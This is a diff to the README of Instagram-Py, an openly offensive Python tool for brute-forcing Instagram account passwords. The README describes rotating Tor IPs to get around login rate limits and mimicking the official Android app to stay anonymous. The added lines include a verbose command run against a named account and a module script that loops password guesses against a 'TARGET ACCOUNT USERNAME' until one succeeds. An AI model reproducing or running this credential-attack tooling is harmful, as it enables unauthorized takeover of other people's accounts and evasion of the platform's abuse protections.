@@ -55,7 +55,7 @@
 
 | We use , **tor** to change our ip once blocked for many tries and continue attack.
 | Since the official api is not a hacker wants, So we use the **InstagramAPK signature** to stay **anonymous!**
-| And we also **save** the **progress** so that even in network interuption we can avoid breaking the computer!
+| And we also **save** the **progress** so that even in network interruption we can avoid breaking the computer!
 
  **See the 'Algorimthm' section down below for more hackery!**
 
@@ -63,7 +63,7 @@
  What?
 -------
 
-| **Instagram-Py** is a simple python script to perform basic **brute force** attack against **Instagram** ,   
+| **Instagram-Py** is a slick python script to perform  **brute force** attack against **Instagram** ,   
 | this script can **bypass** login limiting on wrong passwords ,  so basically it can test **infinite number of passwords**.
 | Instagram-Py is **proved** and can test **over 6M** passwords on a single instagram account with **less resource** as possible
 | This script mimics the activities of the official **instagram android app** and sends request over **tor** so you are secure ,
@@ -105,7 +105,7 @@ located at **~/instapy-config.json** , do not change anything except tor configu
 
  $ vim ~/instapy-config.json # open it with your favorite text editior!
 
-**The configuration file looks like this**
+**The configuration file looks like this ( do not copy this , download the file from repo )**
 
 ::
 
@@ -176,6 +176,15 @@ open your **tor configuration** file usually located at **/etc/tor/torrc**
 
 **Instagram-Py** uses a very simple algorimthm for checking passwords efficiently , this section is dedicated for those who
 wish to recreate this program in any other language.
+
+
+**You can see this live when you run the tool in maximam verbosity**
+
+```
+ $ instagram-py -vvv instatestgod__ password_list.lst
+```
+
+**You can also use Instagram-Py as a module , so that you can also use it in your script**
 
 -------------
  What we do
@@ -254,6 +263,109 @@ because of wordlist encoding error which i ignored because all the worldlist hav
 **Message = Too many tries** , Time to change our ip and loop but we don't want to change our magic cookie
 
 **Thats it you just hacked instagram with a very simple algorithm!**
+
+==============
+ Contribution
+==============
+
+.. image:: https://img.shields.io/github/contributors/deathsec/instagram-py.svg?style=flat-square
+
+
+Contribute anything you can to this repo **(Issues | Pull request)** , help is much **appreciated**.
+
+---------------------
+ How to contribute ?
+---------------------
+
+* Fork **https://github.com/DeathSec/Instagram-Py** via **Github**
+* Clone the Forked repo to your computer
+* Create a new branch with the name linked to the problem ( optional )
+* Do your changes in the new branch
+
+::
+
+ $ git clone https://github.com/yourusername/instagram-py
+ $ git checkout -b "Your new branch name"
+ $ # DO YOUR CHANGES
+
+* push the changes to your repo
+* Merge your branch through a simple **pull request** to my repo explaning the changes you made.
+
+
+===========================
+ Using Instagram-Py as API
+===========================
+
+**Instagram-Py supports to be used as a module as of v1.3.2 , so you don't want to reproduce my code. Just use it!**
+
+For some reason you wish not to use my software then you can use my software as a module and embed into your own
+software , anyway its native so its just gonna run the same as the official command-line tool unless you do something crazy.
+
+**Follow the same installation method mentioned above to install Instagram-Py API.**
+
+This is a simple script to conduct a bructe force attack using instagram-py as a API.
+
+::
+
+ #!/usr/bin/env python3
+ '''
+   This is the same thing that is in the __init__ file of the command-line
+   tool.
+ '''
+ from InstagramPy.InstagramPyCLI import InstagramPyCLI
+ from InstagramPy.InstagramPySession import InstagramPySession , DEFAULT_PATH
+ from InstagramPy.InstagramPyInstance import InstagramPyInstance
+ from datetime import datetime
+ 
+ username = "TARGET ACCOUNT USERNAME"
+ password = "PASSWORD LIST PATH"
+
+ appInfo = {
+    "version"     : "0.0.1",
+    "name"        : "Instagram-Py Clone",
+    "description" : "Some Module to crack instagram!",
+    "author"      : "YourName",
+    "company"     : "YourCompany",
+    "year"        : "2017",
+    "example"     : ""
+ }
+
+ cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3)
+ 
+ '''
+ # USE THIS IF YOU WANT
+ cli.PrintHeader()
+ cli.PrintResource( username , password)
+ cli.PrintDatetime()
+ '''
+ session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)
+ session.ReadSaveFile(True) # True to countinue attack if found save file.
+ '''
+ # USE THIS IF YOU WANT
+ cli.PrintMagicCookie(session.magic_cookie)
+ '''
+
+ '''
+  Defining @param cli = None will make Instagram-Py run silently so you
+  can you use your own interface if you like.
+  or if you want to use the official interface then declare like this
+
+  instagrampy = InstagramPyInstance(cli = cli , session = session)
+
+ '''
+
+ instagrampy = InstagramPyInstance(cli = None ,session = session)
+ while not instagrampy.PasswordFound():
+        instagrampy.TryPassword()
+
+ exit(0) 
+
+
+
+**Refer the Wiki to get full information about the api , https://github.com/deathsec/instagram-py/wiki**
+
+
+
 
 =============
    License
